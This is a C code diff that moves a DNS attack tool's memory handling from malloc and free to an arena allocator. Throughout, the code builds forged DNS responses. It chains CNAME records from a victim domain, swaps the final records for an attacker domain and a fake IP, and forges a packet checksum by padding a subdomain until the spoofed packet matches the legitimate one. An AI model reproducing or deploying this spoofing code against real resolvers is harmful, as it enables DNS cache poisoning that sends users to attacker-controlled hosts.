@@ -4,6 +4,7 @@
     Help Build the origin CNAME Chain
 */
 void _build_chain(
+    Arena* arena,
     struct dns_query** query,
     struct dns_answer** answers,
     char* qname,
@@ -12,7 +13,7 @@ void _build_chain(
     char* ip,
     size_t length
 ) {
-    query[0] = new_dns_query_a(qname);
+    query[0] = new_dns_query_a(arena, qname);
 
     // domain 
     char cur_domain[DOMAIN_MAX_LEN];
@@ -20,19 +21,19 @@ void _build_chain(
 
     // a. qname -> prefix0.victim
     snprintf(cur_domain, DOMAIN_MAX_LEN, "%s0.%s", prefix, domain);
-    answers[0] = new_dns_answer_cname(qname, cur_domain, 3600);
+    answers[0] = new_dns_answer_cname(arena, qname, cur_domain, 3600);
 
     // b. CNAME链
     for (size_t i = 0; i < length; i++) {
         snprintf(cur_domain, DOMAIN_MAX_LEN, "%s%zu.%s", prefix, i, domain);
         snprintf(next_domain, DOMAIN_MAX_LEN, "%s%zu.%s", prefix, i + 1, domain);
         // answers数组的索引是 i+1
-        answers[i + 1] = new_dns_answer_cname(cur_domain, next_domain, 3600);
+        answers[i + 1] = new_dns_answer_cname(arena, cur_domain, next_domain, 3600);
     }
 
     // c. A record
     snprintf(cur_domain, DOMAIN_MAX_LEN, "%s%zu.%s", prefix, length, domain);
-    answers[length + 1] = new_dns_answer_a(cur_domain, inet_addr(ip), 3600);
+    answers[length + 1] = new_dns_answer_a(arena, cur_domain, inet_addr(ip), 3600);
 
 }
 
@@ -41,6 +42,7 @@ void _build_chain(
     Build an authoritative-like response with a CNAME chain.
 */
 size_t _build_std_resp(
+    Arena* arena,
     uint8_t* packet,
     size_t packet_len,
     char* qname,
@@ -60,6 +62,7 @@ size_t _build_std_resp(
     
     // Build CNAME Chain
     _build_chain(
+        arena,
         query,
         answers,
         qname,
@@ -92,14 +95,6 @@ size_t _build_std_resp(
     printf("_build_std_resp: payload created with size: %zu bytes.\n", dns_payload_len);
 #endif
 
-    if (query[0]) {
-        free_dns_query(query[0]);
-    }
-    for (size_t i = 0; i < answer_count; i++) {
-        if (answers[i]) {
-            free_dns_answer(answers[i]);
-        }
-    }
     return dns_payload_len;
 }
 
@@ -107,6 +102,7 @@ size_t _build_std_resp(
     Build Original Packet Used to Fake Std Response
 */
 size_t _build_origin_fake_resp(
+    Arena* arena,
     uint8_t* packet,
     size_t packet_len,
     char* qname,
@@ -129,6 +125,7 @@ size_t _build_origin_fake_resp(
 
     // Build Origin Std CNAME Chain
     _build_chain(
+        arena,
         query,
         answers,
         qname,
@@ -144,19 +141,16 @@ size_t _build_origin_fake_resp(
     struct dns_answer* answer;
     // change the last A record
     snprintf(domain, DOMAIN_MAX_LEN, "%s", attacker);
-    answer = new_dns_answer_a(domain, inet_addr(fake_ip), 3600);
-    free(answers[length + 1]);
+    answer = new_dns_answer_a(arena, domain, inet_addr(fake_ip), 3600);
     answers[length + 1] = answer;
     // change the last but not least CNAME
     snprintf(last_domain, DOMAIN_MAX_LEN, "%s.%s", subdomain, victim);
-    answer = new_dns_answer_cname(last_domain, domain, 3600);
-    free(answers[length]);
+    answer = new_dns_answer_cname(arena, last_domain, domain, 3600);
     answers[length] = answer;
     // change the last last CNAME
     snprintf(domain, DOMAIN_MAX_LEN, "%s", last_domain);
     snprintf(last_domain, DOMAIN_MAX_LEN, "%s%d.%s", prefix, length - 2, victim);
-    answer = new_dns_answer_cname(last_domain, domain, 3600);
-    free(answers[length - 1]);
+    answer = new_dns_answer_cname(arena, last_domain, domain, 3600);
     answers[length - 1] = answer;
 
 
@@ -182,14 +176,6 @@ size_t _build_origin_fake_resp(
     printf("_build_origin_fake_resp: payload created with size: %zu bytes.\n", dns_payload_len);
 #endif
 
-    if (query[0]) {
-        free_dns_query(query[0]);
-    }
-    for (size_t i = 0; i < answer_count; i++) {
-        if (answers[i]) {
-            free_dns_answer(answers[i]);
-        }
-    }
     return dns_payload_len;
 }
 
@@ -265,6 +251,7 @@ bool cmp_payloads(const uint8_t* payload1, size_t len1, const uint8_t* payload2,
 */
 
 int find(
+    Arena* arena,
     struct findres* findres,
     const uint8_t* data, 
     size_t data_len, 
@@ -281,7 +268,7 @@ int find(
 
     // Init findres
     size_t capacity = 4;
-    findres->positions = alloc_memory(sizeof(int) * capacity);
+    findres->positions = arena_alloc_memory(arena, sizeof(int) * capacity);
     if (!findres->positions)
         return -1;
 
@@ -293,10 +280,9 @@ int find(
         
         // Need to realloc more space
         if (findres->count >= capacity) {
+            int* new_pos = arena_realloc(arena, findres->positions, sizeof(int) * capacity, sizeof(int) * 2 * capacity);
             capacity *= 2;
-            int* new_pos = realloc(findres->positions, sizeof(int) * capacity);
             if (!new_pos) {
-                free(findres->positions);
                 findres->positions = NULL;
                 findres->count = 0;
                 return -1;
@@ -313,22 +299,11 @@ int find(
 }
 
 /*
-    Free the uesd find result
-*/
-
-void free_findres(struct findres* result) {
-    if (result && result->positions) {
-        free(result->positions);
-        result->positions = NULL;
-        result->count = 0;
-    }
-}
-
-/*
     Fake the Payload
 */
 
 char* fake(
+    Arena* arena,
     uint64_t target_sum, 
     uint64_t current_sum, 
     const char* data_str, 
@@ -336,24 +311,22 @@ char* fake(
 ) {
     int64_t total_delta = target_sum - current_sum;
     if (total_delta == 0) 
-        return _strdup(data_str);
+        return arena_strdup(arena, data_str);
 
     size_t n_bytes = strlen(data_str);
-    char* modified_str = _strdup(data_str);
+    char* modified_str = arena_strdup(arena, data_str);
     if (!modified_str) 
         return NULL;
 
     for (size_t i = 0; i < n_bytes; ++i) {
         if (!isalnum((unsigned char)modified_str[i])) {
             fprintf(stderr, "Original string '%s' contains non-alnum chars.\n", data_str);
-            free(modified_str);
             return NULL;
         }
     }
     
-    int64_t* factors = calloc(n_bytes, sizeof(int64_t));
+    int64_t* factors = arena_alloc_memory(arena, n_bytes * sizeof(int64_t));
     if(!factors) {
-        free(modified_str);
         return NULL;
     }
 
@@ -397,17 +370,15 @@ char* fake(
         }
     }
     
-    free(factors);
-
     if (remaining_delta != 0) {
         fprintf(stderr, "Cannot forge checksum. Delta of %lld remains.\n", (long long)remaining_delta);
-        free(modified_str);
         return NULL;
     }
     return modified_str;
 }
 
 size_t build_fake_resp(
+    Arena* arena,
     uint8_t* packet,
     size_t packet_len,
     char* qname, 
@@ -418,13 +389,15 @@ size_t build_fake_resp(
     char* fake_ip, 
     size_t length
 ) {
-    uint8_t* std_pkt = alloc_memory(LARGE_PKT_MAX_LEN);
-    uint8_t* origin_pkt = alloc_memory(LARGE_PKT_MAX_LEN);
-    char* sub = _strdup("x"); // Initial subdomain
+    Arena_Mark mark = arena_snapshot(arena);
+
+    uint8_t* std_pkt = arena_alloc_memory(arena, LARGE_PKT_MAX_LEN);
+    uint8_t* origin_pkt = arena_alloc_memory(arena, LARGE_PKT_MAX_LEN);
+    char* sub = arena_strdup(arena, "x"); // Initial subdomain
 
     // 1. Build initial packets
-    size_t std_len = _build_std_resp(std_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, origin_ip, length);
-    size_t origin_len = _build_origin_fake_resp(origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
+    size_t std_len = _build_std_resp(arena, std_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, origin_ip, length);
+    size_t origin_len = _build_origin_fake_resp(arena, origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
     
     struct chkres std_check, origin_check;
     if (check_payload(&std_check, std_pkt, std_len) ||
@@ -456,16 +429,15 @@ size_t build_fake_resp(
             goto fail;
         }
 
-        free(sub);
         size_t sub_len = 1 + diff / 2;
         // new padding
-        sub = malloc(sub_len + 1);
+        sub = arena_alloc(arena, sub_len + 1);
         memset(sub, 'x', sub_len);
         sub[sub_len] = '\0';
 #ifdef _DEBUG
         printf("build_fake_resp: New subdomain for padding: %s\n", sub);
 #endif
-        origin_len = _build_origin_fake_resp(origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
+        origin_len = _build_origin_fake_resp(arena, origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
 
         if (check_payload(&origin_check, origin_pkt, origin_len)) {
 #ifdef _DEBUG
@@ -491,7 +463,7 @@ size_t build_fake_resp(
         printf("build_fake_resp: std_sum: %llu, origin_sum: %llu\n", (unsigned long long)std_check.sum, (unsigned long long)origin_check.sum);
 #endif
         struct findres pos;
-        find(&pos, origin_pkt, origin_len, sub);
+        find(arena, &pos, origin_pkt, origin_len, sub);
 #ifdef _DEBUG
         printf("build_fake_resp: Found %zu occurrences of '%s' to modify.\n", pos.count, sub);
         printf("build_fake_resp: the occurrences is (");
@@ -500,8 +472,7 @@ size_t build_fake_resp(
         }
         printf(")\n");
 #endif
-        char* new_sub = fake(std_check.sum, origin_check.sum, sub, &pos);
-        free_findres(&pos);
+        char* new_sub = fake(arena, std_check.sum, origin_check.sum, sub, &pos);
 
         if (!new_sub) {
             fprintf(stderr, "fake_checksum failed.\n");
@@ -510,10 +481,9 @@ size_t build_fake_resp(
 #ifdef _DEBUG
         printf("build_fake_resp: New forged subdomain: %s\n", new_sub);
 #endif
-        free(sub);
         sub = new_sub;
 
-        origin_len = _build_origin_fake_resp(origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
+        origin_len = _build_origin_fake_resp(arena, origin_pkt, LARGE_PKT_MAX_LEN, qname, prefix, victim, attacker, fake_ip, sub, length);
         if (check_payload(&origin_check, origin_pkt, origin_len)) {
 #ifdef _DEBUG
             printf("build_fake_resp: can't check payload after fake\n");
@@ -527,9 +497,6 @@ size_t build_fake_resp(
 #ifdef _DEBUG
         printf("build_fake_resp: Final payload check passed! Forged packet is ready.\n");
 #endif
-        free(std_pkt);
-        free(sub);
-
         if (packet_len < origin_len) {
             fprintf(stderr, "Packet Too Small\n");
 #ifdef _DEBUG
@@ -544,8 +511,6 @@ size_t build_fake_resp(
 
 fail:
     fprintf(stderr, "Failed to build fake response.\n");
-    free(std_pkt);
-    free(origin_pkt);
-    free(sub);
+    arena_rewind(arena, mark);
     return 0;
 }
